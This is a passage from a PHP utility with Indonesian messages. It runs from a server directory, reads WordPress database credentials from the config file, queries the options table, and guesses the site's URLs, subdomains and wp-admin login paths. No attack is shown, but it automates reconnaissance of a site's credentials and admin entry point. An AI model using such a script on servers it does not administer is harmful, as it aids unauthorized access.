function ba_urls_from_config_text($txt)
{
    $urls = array();
    $keys = array('WP_HOME', 'WP_SITEURL', 'SITEURL', 'HOME');
    $i = 0;
    $kn = count($keys);
    for ($i = 0; $i < $kn; $i++) {
        $v = ba_resolve_cfg_value($keys[$i], ba_cfg_get($keys[$i], $txt), $txt);
        if ($v !== '' && preg_match('#^https?://#i', $v)) {
            $urls[rtrim($v, '/')] = $keys[$i] . ' (config)';
        }
    }
    return $urls;
}

function ba_urls_from_db($mysqli, $pref)
{
    $urls = array();
    $opts = array('siteurl', 'home');
    $i = 0;
    $on = count($opts);
    for ($i = 0; $i < $on; $i++) {
        $name = $mysqli->real_escape_string($opts[$i]);
        $rs = @$mysqli->query("SELECT option_value FROM {$pref}options WHERE option_name='{$name}' LIMIT 1");
        if ($rs && $rs->num_rows > 0) {
            $row = $rs->fetch_assoc();
            $v = trim((string) $row['option_value']);
            if ($v !== '' && preg_match('#^https?://#i', $v)) {
                $urls[rtrim($v, '/')] = $opts[$i] . ' (database)';
            }
        }
    }
    return $urls;
}

function ba_guess_urls_from_path($base)
{
    $urls = array();
    $rp = @realpath($base);
    if (!$rp) {
        return $urls;
    }
    $host = '';
    if (!empty($_SERVER['HTTP_HOST'])) {
        $host = $_SERVER['HTTP_HOST'];
    }
    $scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
    $doc = !empty($_SERVER['DOCUMENT_ROOT']) ? @realpath($_SERVER['DOCUMENT_ROOT']) : false;
    if ($host !== '' && $doc && strpos($rp, $doc) === 0) {
        $rel = trim(str_replace('\\', '/', substr($rp, strlen($doc))), '/');
        $path = $rel !== '' ? '/' . $rel : '';
        $urls[$scheme . '://' . $host . $path] = 'tebak dari path + domain saat ini';
        $urls[$scheme . '://' . $host . $path . '/wp-admin/'] = 'wp-admin (tebakan path)';
    }
    $folder = basename($rp);
    if ($host !== '' && $folder !== '' && $folder !== 'html' && $folder !== 'public_html' && $folder !== 'www') {
        $parts = explode('.', $host);
        if (count($parts) >= 2) {
            $root = $parts[count($parts) - 2] . '.' . $parts[count($parts) - 1];
            $urls[$scheme . '://' . $folder . '.' . $root] = 'tebak subdomain folder';
            $urls[$scheme . '://' . $folder . '.' . $root . '/wp-admin/'] = 'wp-admin (tebak subdomain)';
        }
    }
    return $urls;
}

function ba_lookup_site_urls($base, $manual = null)
{
    if ($base === '' && ($manual === null || empty($manual['ok']))) {
        return array('ok' => false, 'msg' => ba_not_found_msg());
    }
    if ($base === '') {
        $base = dirname(__FILE__);
    }
    $cfg = ba_get_db_config($base, $manual);
    if (!$cfg['ok']) {
        return $cfg;
    }
    $urls = array();
    $file = !empty($cfg['config_file']) ? $cfg['config_file'] : ba_locate_config_file($base);
    if ($file !== '' && is_readable($file) && substr($file, -4) !== '.env') {
        $txt = @file_get_contents($file);
        if ($txt !== false) {
            $urls = array_merge($urls, ba_urls_from_config_text($txt));
        }
    }
    $conn = ba_connect($cfg['db']);
    if (!$conn['ok']) {
        return $conn;
    }
    $m = $conn['mysqli'];
    $pref = $cfg['prefix'];
    $urls = array_merge($urls, ba_urls_from_db($m, $pref));
    $m->close();
    $urls = array_merge($urls, ba_guess_urls_from_path($base));
    if (count($urls) === 0) {
        return array('ok' => false, 'msg' => 'URL tidak ditemukan di config/DB. Coba tebak: https://DOMAIN/noti/ jika folder = /var/www/html/noti/');
    }
    return array('ok' => true, 'urls' => $urls, 'pref' => $pref);
}

function ba_test_db($base, $manual = null)
{
    if ($base === '' && ($manual === null || empty($manual['ok']))) {
        return array('ok' => false, 'msg' => ba_not_found_msg());
    }
    if ($base === '' && $manual !== null && $manual['ok']) {
        $base = dirname(__FILE__);
